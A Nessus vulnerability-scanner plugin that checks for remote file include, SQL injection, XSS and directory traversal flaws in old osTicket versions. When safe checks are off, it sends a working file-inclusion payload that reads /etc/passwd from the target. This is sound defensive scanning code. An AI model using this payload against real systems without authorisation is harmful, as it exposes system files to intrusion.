#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(18193);
  script_version("$Revision: 1.18 $");

  script_cve_id(
    "CVE-2005-1436", 
    "CVE-2005-1437", 
    "CVE-2005-1438", 
    "CVE-2005-1439"
  );
  script_bugtraq_id(13478);
  script_osvdb_id(
    16270,
    16271,
    16272,
    16273,
    16274,
    16275,
    16276,
    16277,
    16278,
    16279
  );

  script_name(english:"osTicket <= 1.2.7 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The version of osTicket installed on the remote host suffers from
several vulnerabilities :

  - A Remote File Include Vulnerability
    The script 'include/main.php' lets an attacker read 
    arbitrary files on the remote host and possibly even run
    arbitrary PHP code, subject to the privileges of the web
    server user.

  - Two SQL Injection Vulnerabilities
    An authenticated attacker can affect SQL queries through 
    the 'id' parameter of the 'admin.php' script as well as 
    the 'cat' parameter of the 'view.php' script.

  - Multiple Cross-Site Scripting Vulnerabilities
    osTicket does not properly sanitize user-supplied input
    in several scripts, which could facilitate the theft of
    cookie-based authentication credentials within the
    context of the affected website.

  - A Directory Traversal Vulnerability
    The 'attachments.php' script may let an authenticated 
    attacker read arbitrary files on the remote, subject to 
    the privileges of the server user. This occurs only if 
    attachment uploads have been specifically enabled by the
    administrator." );
  # http://web.archive.org/web/20080313112108/http://www.gulftech.org/?node=research&article_id=00071-05022005
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?da21f0a8" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/May/50" );
  # http://web.archive.org/web/20070824140732/http://www.osticket.com/forums/showthread.php?t=1333
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?322db726" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to osTicket version 1.3.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/05/04");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/05/02");
 script_cvs_date("$Date: 2016/11/02 14:37:08 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:osticket:osticket");
script_end_attributes();

  script_summary(english:"Checks for multiple vulnerabilities in osTicket <= 1.2.7");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_dependencies("osticket_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/osticket");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/osticket"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Check for the vulnerability.
  #
  # - if safe checks are enabled...
  if (safe_checks()) {
    if (ver  =~ "^(0\.|1\.([01]\.|2\.[0-7]|3\.[01]))") {
      extra = string(
          "***** Nessus has determined the vulnerability exists on the remote\n",
          "***** host simply by looking at the version number of osTicket\n",
          "***** installed there.\n");
      security_warning(port:port, extra: extra);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
  # - otherwise, try to exploit the file include vulnerability.
  else {
    # Try to grab /etc/passwd.
    r = http_send_recv3(method: "GET",
      item:string(
        dir, "/src/main.inc.php?",
        "config[path_src_include]=/etc/passwd%00"
      ),
      port:port
    );
    if (isnull(r)) exit(0);

    # It's a problem if there's an entry for root.
    if (egrep(string:r[2], pattern:"root:.+:0:")) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
